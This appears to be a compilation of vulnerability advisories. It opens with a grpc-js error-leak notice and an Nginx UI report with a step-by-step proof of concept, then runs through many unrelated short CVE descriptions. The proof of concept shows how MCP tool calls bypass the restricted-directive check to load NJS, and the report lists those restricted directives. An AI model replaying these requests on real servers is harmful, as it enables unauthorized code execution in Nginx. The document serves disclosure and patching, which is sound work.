### Impact
If an application method handler crashes, the error message is included in the status message sent to the client. This can leak to the client any sensitive data that may be included in the error message. This impacts anyone using `@grpc/grpc-js` to run servers.

### Patches
This vulnerability is fixed in 1.13.6 and 1.14.5.

### Workarounds
This can be avoided by using a top-level error handler in method handlers to strip out sensitive error information.

## Summary

The regular HTTP configuration API rejects restricted Nginx directives such as `load_module`, `js_import`, and `js_content`.

However, the MCP configuration interface allows a secondary authenticated user to write and apply equivalent restricted configuration content. In the lab, this allowed the user to load `ngx_http_js_module.so`, import attacker-controlled JavaScript, reload Nginx, and execute NJS in the Nginx worker context.

This is authenticated and is not OS command execution by itself.

## Affected component

- `/mcp`
- `/mcp_message`
- MCP tool: `nginx_config_add`
- Nginx configuration validation

## Impact

A secondary authenticated user can bypass the restricted directive validation enforced by the HTTP API and execute attacker-controlled NJS inside the Nginx worker context.

This may allow modification of Nginx runtime behavior, including responses, routing, headers, redirects, and request handling.

## Minimal PoC

### Preconditions

- Attacker has a secondary authenticated Nginx UI account.
- MCP is enabled.
- Nginx has NJS available:

```bash
find / -name "ngx_http_js_module.so" 2>/dev/null
```

Observed in the lab:

```text
/usr/lib/nginx/modules/ngx_http_js_module.so
```

### 1. HTTP API blocks the restricted config

Request:

```http
POST /api/configs
Authorization: <SECONDARY_USER_JWT>
Content-Type: application/json
```

Body:

```json
{
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nevents { worker_connections 1024; }\n\nhttp {\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
}
```

Observed result:

```text
Rejected because the content contains restricted directives such as load_module/js_import/js_content.
```

### 2. MCP writes the JavaScript file

Open an MCP session and call `tools/call` with:

```json
{
 "jsonrpc": "2.0",
 "id": 1,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "poc.js",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "function handler(r) { r.return(200, \"MCP_NJS_MARKER\\n\"); }\nexport default { handler };\n"
 }
 }
}
```

### 3. MCP writes the NJS-enabled nginx.conf

Call `tools/call` again:

```json
{
 "jsonrpc": "2.0",
 "id": 2,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nerror_log /var/log/nginx/error.log notice;\npid /run/nginx.pid;\n\nevents { worker_connections 1024; }\n\nhttp {\n default_type application/octet-stream;\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
 }
 }
}
```

### 4. Verify NJS execution

Inside the Nginx UI container:

```bash
curl -i http://127.0.0.1:18249/__poc
```

Observed response:

```http
HTTP/1.1 200 OK

MCP_NJS_MARKER
```

This confirms that content rejected by the HTTP API can be applied through MCP and executed as NJS in the Nginx worker context.

## Expected behavior

MCP configuration tools should enforce the same restricted directive validation as the HTTP API.

## Suggested fix

Apply `ValidateConfigFile(path, content)` before MCP configuration writes and ensure HTTP API and MCP share the same validation tests for restricted directives such as:

- `load_module`
- `js_import`
- `js_content`
- `js_set`
- `perl_set`
- `user root`

WebConnect 6.5, 6.4.4, and possibly earlier versions allows remote attackers to cause a denial of service (hang) via a URL containing an MS-DOS device name such as (1) AUX, (2) CON, (3) PRN, (4) COM1, or (5) LPT1.

Microsoft Internet Information Server (IIS) 5.1 allows remote attackers to view path information via a GET request to (1) /_vti_pvt/access.cnf, (2) /_vti_pvt/botinfs.cnf, (3) /_vti_pvt/bots.cnf, or (4) /_vti_pvt/linkinfo.cnf.

Microsoft Internet Information Server (IIS) 5.1 may allow remote attackers to view the contents of a Frontpage Server Extension (FPSE) file, as claimed using an HTTP request for colegal.htm that contains .. (dot dot) sequences.
Unknown vulnerability in Bavo 0.3 allows remote attackers to modify posted messages.
SQL injection vulnerability in Spooky Login 2.0 through 2.5 allows remote attackers to bypass authentication and gain privileges via the password field.
Off-by-one error in alterMIME 0.1.10 and 0.1.11 allows remote attackers to cause a denial of service (crash) via an x-header that causes snprintf overwrite the FFGET_FILE variable with a (null) byte.
Logitech iTouch keyboards allows attackers with physical access to the system to bypass the screen locking function and execute user-defined commands that have been assigned to a button.

A vulnerability was identified in vvbbnn00 WARP-Clash-API up to c7bf2360073959861219b422e51ae86411051b46. Affected is the function get_surge_subscription of the file services/subscription.py of the component Subscription Handler. Such manipulation of the argument key leads to improper access controls. The attack may be launched remotely. The exploit is publicly available and might be used. This product operates on a rolling release basis, ensuring continuous delivery. Consequently, there are no version details for either affected or updated releases. The vendor was contacted early about this disclosure but did not respond in any way. This vulnerability only affects products that are no longer supported by the maintainer.

SMTP content filter engines, including (1) GFI MailSecurity for Exchange/SMTP before 7.2, (2) InterScan VirusWall before 3.52 build 1494, (3) the default configuration of MIMEDefang before 2.21, and possibly other products, do not detect fragmented emails as defined in RFC2046 ("Message Fragmentation and Reassembly") and supported in such products as Outlook Express, which allows remote attackers to bypass content filtering, including virus checking, via fragmented emails of the message/partial content type.
Buffer overflow in the parsing mechanism for ISS Internet Scanner 6.2.1, when using the license banner HTTP check, allows remote attackers to execute arbitrary code via a long web server response.
Buffer overflow in ipcs for HP Tru64 UNIX 4.0f through 5.1a may allow attackers to execute arbitrary code, a different vulnerability than CVE-2001-0423.
Vulnerability in SGI BDS (Bulk Data Service) BDSPro 2.4 and earlier allows clients to read arbitrary files on a BDS server.

Adobe eBook Reader 2.1 and 2.2 allows a user to copy eBooks to other systems by using the backup feature, capturing the encryption Challenge, and using the appropriate hash function to generate the activation code.
pdesk.cgi in PerlDesk allows remote attackers to gain sensitive information via an invalid lang parameter, which includes pathname information in an error message.

Samba 3.0.6 and earlier allows remote attackers to cause a denial of service (infinite loop and memory exhaustion) via certain malformed requests that cause new processes to be spawned and enter an infinite loop.

Lexar Safe Guard for JumpDrive Secure 1.0 stores the password insecurely in memory using XOR encryption, which allows local users to read the password directly from the device and access the password protected part of the drive.
The CGI counter 4.0.7 by George Burgyan allows remote attackers to execute arbitrary commands via shell metacharacters.
Windows NT Service Control Manager (SCM) allows remote attackers to cause a denial of service via a malformed argument in a resource enumeration request.

Apache 1.4.x before 1.3.30, and 2.0.x before 2.0.49, when using multiple listening sockets on certain platforms, allows remote attackers to cause a denial of service (blocked new connections) via a "short-lived connection on a rarely-accessed listening socket."

Multiple buffer overflows in Ethereal 0.8.13 to 0.10.2 allow remote attackers to cause a denial of service and possibly execute arbitrary code via the (1) NetFlow, (2) IGAP, (3) EIGRP, (4) PGM, (5) IrDA, (6) BGP, (7) ISUP, or (8) TCAP dissectors.
Buffer overflow in Gaim 0.10.3 and earlier using the OSCAR protocol allows remote attackers to conduct a denial of service and possibly execute arbitrary commands via a long HTML tag.

The scripts (1) createdir.php, (2) removedir.php and (3) uploadfile.php for ezContents 1.41 and earlier do not check credentials, which allows remote attackers to create or delete directories and upload files via a direct HTTP POST request.
Buffer overflow in Novell GroupWise 6.0.1 Support Pack 1 allows remote attackers to execute arbitrary code via a long RCPT TO command.
rwcgi60 CGI program in Oracle Reports Server, by design, provides sensitive information such as the full pathname, which could enable remote attackers to use the information in additional attacks.

Buffer overflow in read_smtp_response of protocol.c in libesmtp before 0.8.11 allows a remote SMTP server to (1) execute arbitrary code via a certain response or (2) cause a denial of service via long server responses.
Netscape 6.2.3 and earlier, and Mozilla 1.0.1, allow remote attackers to corrupt heap memory and execute arbitrary code via a GIF image with a zero width.

Cisco VPN 3000 Concentrator 3.6(Rel) and earlier, and 2.x.x, when configured to use internal authentication with group accounts and without any user accounts, allows remote VPN clients to log in using PPTP or IPSEC user authentication.
Vulnerability in phpWebSite before 0.7.9 related to running multiple instances in the same domain, which may allow attackers to gain administrative privileges.
Vulnerability in autodns.pl for AutoDNS before 0.0.4 related to domain names that are not fully qualified.

A flaw was found in EAP's IIOP. The listener's NameService would accept bind operations without authentication, allowing an attacker to hijack JNDI lookups and binding them to a malicious ORB, achieving MITM or DoS on further invocations.

A flaw was found in Picketlink Federation SAML; the unsolcited response handler would accept forged assertions with no verification or validation, permitting an unauthed attacker to authenticate as any principal in any role. This could lead to information disclosure, access to restricted operations, or other flaws.

the Undertow AJP listener honours forged ssl_cert and is_ssl AJP attributes without requiring any shared-secret authentication. This enables an unauthenticated attacker with direct TCP access to port 8009 to bypass CLIENT-CERT authentication by injecting a forged X.509 certificate via the AJP protocol.

A flaw was found in JBoss marshalling. The Infinispan session replication path deserializes replicated session data via the JBoss Marshalling River unmarshaller with no class filtering — enabling RCE via deserialization gadget chains on every cluster node.
ControlIT v4.5 and earlier uses weak encryption to store usernames and passwords in an address book.

The default permissions for the RAS Administration key in Windows NT 4.0 allows local users to execute arbitrary commands by changing the value to point to a malicious DLL, aka one of the "Registry Permissions" vulnerabilities.

The default permissions for the SNMP Parameters registry key in Windows NT 4.0 allows remote attackers to read and possibly modify the SNMP community strings to obtain sensitive information or modify network configuration, aka one of the "Registry Permissions" vulnerabilities.
Abyss Web Server 1.0.3 allows remote attackers to list directory contents via an HTTP GET request that ends in a large number of / (slash) characters.
The wrapper program in mailman 2.0beta3 and 2.0beta4 does not properly cleanse untrusted format strings, which allows local users to gain privileges.
Buffer overflow in AnalogX proxy server 4.04 and earlier allows remote attackers to cause a denial of service via a long HELO command in the SMTP protocol.
